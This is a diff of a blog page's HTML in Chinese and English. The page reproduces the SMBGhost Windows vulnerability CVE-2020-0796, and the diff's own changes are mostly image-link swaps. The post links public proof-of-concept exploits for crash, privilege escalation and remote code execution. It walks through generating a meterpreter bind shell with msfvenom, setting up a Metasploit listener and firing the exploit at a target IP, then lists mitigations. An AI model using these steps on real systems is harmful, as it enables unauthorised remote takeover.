@@ -637,7 +637,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-13
+                    2022-04-16
                 </div>
                 
 
@@ -671,17 +671,17 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Vulnerability-Reproduction-CVE-2020-0796"><a href="#Vulnerability-Reproduction-CVE-2020-0796" class="headerlink" title="Vulnerability Reproduction: CVE-2020-0796"></a>Vulnerability Reproduction: CVE-2020-0796</h1><p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313180558.png"></p>
+                <h1 id="Vulnerability-Reproduction-CVE-2020-0796"><a href="#Vulnerability-Reproduction-CVE-2020-0796" class="headerlink" title="Vulnerability Reproduction: CVE-2020-0796"></a>Vulnerability Reproduction: CVE-2020-0796</h1><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313180558.png"></p>
 <h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><p>A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’.</p>
 <p>Microsoft Windows和Microsoft Windows Server都是美国微软（Microsoft）公司的产品。Microsoft Windows是一套个人设备使用的操作系统。Microsoft Windows Server是一套服务器操作系统。Server Message Block是其中的一个服务器信息传输协议。 Microsoft Server Message Block 3.1.1 (SMBv3)版本中存在输入验证错误漏洞，该漏洞源于SMBv3协议在处理恶意压缩数据包时，进入了错误流程。远程未经身份验证的攻击者可利用该漏洞在应用程序中执行任意代码。以下产品及版本受到影响：Microsoft Windows 10版本1903，Windows Server版本1903，Windows 10版本1909，Windows Server版本1909。</p>
 <p>漏洞公告显示，SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
 <p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p>
 <h2 id="Bx-Attack"><a href="#Bx-Attack" class="headerlink" title="Bx Attack"></a>Bx Attack</h2><h4 id="蓝屏POC"><a href="#蓝屏POC" class="headerlink" title="蓝屏POC"></a>蓝屏POC</h4><p>POC：<a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313123511.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313123511.png"></p>
 <p>打开win10，发现已经蓝屏</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313123548.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313123548.png"></p>
 <h4 id="本地提权POC"><a href="#本地提权POC" class="headerlink" title="本地提权POC"></a>本地提权POC</h4><p><a target="_blank" rel="noopener" href="https://github.com/danigargu/CVE-2020-0796/">https://github.com/danigargu/CVE-2020-0796/</a></p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313172416.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313172416.png"></p>
 <h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><p>EXP：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
 <p>a 生成木马:🐎</p>
 <pre class=" language-bash"><code class="language-bash">msfvenom -p windows/x64/meterpreter/bind_tcp lport<span class="token operator">=</span>2333 -f py -o exp.py
@@ -691,7 +691,7 @@
 :%s/buf/USER_PAYLOAD/    <span class="token comment" spellcheck="true"># 将buf替换成USER_PAYLOAD</span>
 </code></pre>
 <p>c 将生成的shellcode全部替换到exp中的shellcode</p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313173515.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313173515.png"></p>
 <p>d 打开msf，开启监听本地4444</p>
 <pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
 <span class="token keyword">set</span> payload windows/x64/meterpreter/bind_tcp
@@ -700,7 +700,7 @@ run
 </code></pre>
 <p>e 开打！</p>
 <p><code>python3 exploit.py -ip 目标IP</code></p>
-<p><img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/20210313140407.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/20210313140407.png"></p>
 <h2 id="Cx-Defense"><a href="#Cx-Defense" class="headerlink" title="Cx Defense"></a>Cx Defense</h2><p>1.运行regedit.exe，打开注册表编辑器，在HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters建立一个名为DisableCompression的DWORD，值为1，禁止SMB的压缩功能。</p>
 <p>2.更新、打补丁：<a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762</a></p>
 <p>3.禁用445端口</p>
@@ -966,7 +966,7 @@ run
                 <a href="/posts/8d0f.html">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210321155515270.png" class="responsive-img" alt="Ensp cloud connect Internet">
+                        <img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210321155515270.png" class="responsive-img" alt="Ensp cloud connect Internet">
                         
                         <span class="card-title">Ensp cloud connect Internet</span>
                     </div>
@@ -1018,7 +1018,7 @@ run
                 <a href="/posts/c89c.html">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20210503004004951.png" class="responsive-img" alt="English-lenword">
+                        <img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20210503004004951.png" class="responsive-img" alt="English-lenword">
                         
                         <span class="card-title">English-lenword</span>
                     </div>
@@ -1338,7 +1338,7 @@ run
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">220.9k</span>&nbsp;字
+                class="white-color">221k</span>&nbsp;字
             
             
             
